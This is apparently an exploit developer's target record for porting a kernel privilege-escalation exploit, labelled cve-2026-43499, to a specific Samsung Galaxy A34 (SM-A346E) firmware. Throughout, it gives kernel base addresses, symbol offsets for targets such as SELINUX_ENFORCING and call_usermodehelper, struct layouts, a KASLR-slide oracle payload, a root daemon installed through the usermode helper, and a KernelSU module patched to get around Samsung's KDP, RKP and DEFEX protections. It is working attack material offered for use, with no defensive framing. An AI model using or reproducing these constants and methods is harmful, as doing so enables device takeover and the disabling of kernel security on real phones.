# SM-A346E A346EXXSDEZB6 target record

## Firmware identity

```text
model: SM-A346E
device: a34x
display build: BP2A.250605.031.A3.A346EXXSDEZB6
fingerprint: samsung/a34xdxx/a34x:16/BP2A.250605.031.A3/A346EXXSDEZB6:user/release-keys
kernel release: 6.6.82-android15-8-abA346EXXSDEZB6-4k
SDK: 36
ABI: arm64-v8a
page size: 4096
SoC: MediaTek MT6877
```

## Target derivation

The local `boot.img` was unpacked and recovered to:

```text
boot.img                (v4 boot image, no kernel_addr field)
kernel                  (gzip-compressed kernel image)
kernel_decompressed     (ARM64 Image, decompressed)
vmlinux.elf             (recovered ELF, named symbols resolved)
vmlinux.btf             (device-identical BTF, 6,288,259 bytes)
```

SHA-256 provenance:

```text
boot.img:            D4D4878031CA057D5535832783AEBF9CC9A5EA9190669776350FFDE1A8F54E82
kernel:              4C36A44F3FD1C089BD94D977EF7ABF40D797D7D2BBB0A08CCF222DD1C803FAFF
kernel_decompressed: D73F732EFE2DC7F3C2343AC41EFF77025EA69D2B972182C15EC3F91FE371867D
vmlinux.btf:         8CE621DCCE39415E7C0F7BDAA177569E7EF8AB3C8A935BAAC5E6EE6944267DFB
```

`_text` of the recovered ELF is at VA `0xffffffc080000000`, so runtime kernel
addresses are `KIMAGE_TEXT_BASE + kaslr_slide + *_OFF` (imagebase 0).

Important target constants:

```text
KIMAGE_TEXT_BASE: 0xffffffc080000000
P0_PAGE_OFFSET:   0xffffff8000000000
P0_PHYS_OFFSET:   0x40000000          (MTK family; Exynos uses 0x80000000)
P0_KERNEL_PHYS_LOAD: 0x40000000
DIRECT_MAP_BASE:  0xffffff8000000000
VMEMMAP_START:    0xfffffffe00000000
sched_blocked_reason tracepoint id: 109   (verified on device)
worker_thread post-schedule caller offset: 0x00150460
SLIDE_PSELECT_WORD_SHIFT: 0
```

`P0_PHYS_OFFSET` was confirmed as MTK `0x40000000` from the device: the DMA32
zone reports `start_pfn 262144` at 4k pages (`262144 * 4096 = 0x40000000`), so
the physical kernel load base is `0x40000000`, not the Exynos `0x80000000`.

The P0 oracle fingerprint table maps the actual slide to bytes read at raw
offset `P0_ORACLE_PROBE_OFFSET - slide`, mirroring the essi target. The oracle
slot layout and P0 conversion are identical to the essi A56 port.

Key symbol offsets (VA - KIMAGE_TEXT_BASE):

```text
CALL_USERMODEHELPER_EXEC_WORK: 0x00a32818
NOOP_LLSEEK:                   0x010458b8
COPY_SPLICE_READ:              0x0021c198
CONFIGFS_READ_ITER:            0x00a7dab4
CONFIGFS_BIN_WRITE_ITER:       0x00a7dfe0
ASHMEM_IOCTL:                  0x003bc5d8
ASHMEM_COMPAT_IOCTL:           0x01077128
ASHMEM_MMAP:                   0x003bcd68
ASHMEM_OPEN:                   0x003bcf98
ASHMEM_RELEASE:                0x003bd020
ASHMEM_SHOW_FDINFO:            0x003bd0ac
ANON_PIPE_BUF_OPS:             0x0123a948
ASHMEM_FOPS:                   0x013c2c70
ASHMEM_MISC:                   0x0243d860
KMALLOC_CACHES:                0x017944f0
SYSTEM_UNBOUND_WQ:             0x022cae60
INIT_TASK:                     0x022de340
ROOT_TASK_GROUP:               0x024d8d80
SELINUX_ENFORCING:             0x0251b4b8
SYSCTL_BOOTID:                 0x025bd070
SLIDE_NFULNL_LOGGER_OBJECT:    0x022d2278
SLIDE_NFULNL_LOGGER_NAME:      0x017216f0
SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR: 0x023fa7e0
```

## BTF struct layout notes

All struct layouts match the essi-A566EXXSCCZG6 `target.h` byte-for-byte:

- `rt_mutex_waiter` 0x70 (non-LEGACY, non-COMPACT): tree 0x00, pi_tree 0x28,
  task 0x50, lock 0x58, wake_state 0x60, ww_ctx 0x68;
- Samsung `configfs_buffer` 0x80: count 0, pos 8, page 0x10, ops 0x18,
  needs_read_fill 0x50, read_in_progress 0x54, write_in_progress 0x55,
  bin_buffer 0x58, bin_buffer_size 0x60, cb_max_size 0x64, item 0x68,
  owner 0x70;
- `configfs_bin_attribute` 0x48: cb_attr 0, cb_private 0x28, cb_max_size 0x30,
  read 0x38, write 0x40;
- `miscdevice` 0x50: fops 0x10, name 8.

## Exploit payload

App-domain physical P0 oracle payload (same architecture as essi):

```text
artifacts/a34x-A346EXXSDEZB6/cve-2026-43499-app.so
BUILD: a34x-A346EXXSDEZB6-app-physical-p0-oracle
P0_ORACLE_PROBE_OFFSET: 0x1f0000
P0_FINGERPRINT_WORDS:   8
slides:                 32 (0x000000..0x1f0000 step 0x10000)
```

Built with Android NDK r29 (29.0.14206865), API 35, AArch64:

```text
artifacts/a34x-A346EXXSDEZB6/cve-2026-43499-app.so
size: 104128
SHA-256: 06d33d1b979adae48958f59aed24a0d3b5e1c9e88b456e5da4d260f26a65f17d
```

The fingerprint readback was validated against the local kernel image: all 256
oracle qwords read at `0x1f0000 - slide` decode to the expected kernel bytes.

## Root daemon

The root UMH route installs:

```text
/data/local/tmp/cve-2026-43499-root
```

via `call_usermodehelper` (`ROOT_UMH_WORK_OFF 0x6000`, `ROOT_UMH_DATA_OFF
0x6200` in the fake task).

## KernelSU

Built from KernelSU `v3.2.5` (commit `b0bc817b4e966aa6aa830834eaf6ef765d821d40`)
with the Samsung KDP/RKP/DEFEX patch, in:

```text
ghcr.io/ylarod/ddk-min:android15-6.6-20260313
```

The DDK release was overridden to the exact target release:

```text
vermagic: 6.6.82-android15-8-abA346EXXSDEZB6-4k SMP preempt mod_unload modversions aarch64
```

Build config (MTK, no Exynos EL2 constraint):

```text
CONFIG_KSU=m
CONFIG_KSU_SAMSUNG_KDP=y
CONFIG_KSU_SAMSUNG_RKP=y
CONFIG_KSU_SAMSUNG_DEFEX=y
```

The stripped standalone KO is:

```text
kernelsu/android15-6.6_kernelsu-A346EXXSDEZB6-kdp.ko
size: 327464
SHA-256: 22d0aa1822a413878aa76cc90c72b63826d0f602c51f3fd8934c7018897292c8
```

Static checks passed (audit against the recovered `vmlinux.elf` and the
extracted target `Module.symvers`, 16183 CRCs):

```text
undefined symbols: 221
module version entries: 0
missing from target symbol table: 0
symbols resolved from kallsyms rather than target exports: 58
target CRC mismatches: 0
__versions size: 0
```

The Android/AArch64 `ksud` binary embeds the A346E KO as
`android15-6.6_kernelsu.ko`:

```text
kernelsu/ksud-A346EXXSDEZB6-kdp
size: 4764952
SHA-256: 39db01426f7b3810127e8367779c8d8ce6ec3cf92fba1a24eeb67d8021711ab7
```

Built with Rust 1.97.1 for `aarch64-linux-android` against NDK r29 (API 35).

## Hardware status

- app-domain payload/root daemon: pending execution on the connected SM-A346E;
- KernelSU: built and statically audited; late-load test pending on hardware.

The firmware is MTK, so the oracle/physrw route uses `P0_PHYS_OFFSET
0x40000000` (unlike Exynos essi). Everything else in the exploit path is shared
with the essi A56 port.
